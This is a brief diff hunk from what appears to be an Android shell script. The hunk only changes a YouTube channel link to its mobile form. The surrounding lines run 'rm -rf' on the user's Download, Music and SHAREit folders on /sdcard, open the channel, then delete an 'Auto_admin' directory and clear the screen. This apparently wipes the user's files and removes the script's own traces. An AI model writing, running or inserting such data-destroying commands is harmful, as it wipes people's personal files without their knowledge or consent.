@@ -53,7 +53,7 @@ rm -rf cd /sdcard/Download
 rm -rf cd /sdcard/Music
 rm -rf cd /sdcard/SHAREit
 cd
-xdg-open https://youtube.com/channel/UCldyBI4H1jK-X0RweVV5dkw
+xdg-open https://m.youtube.com/channel/UCldyBI4H1jK-X0RweVV5dkw
 sleep 2
 rm -rf Auto_admin
 clear
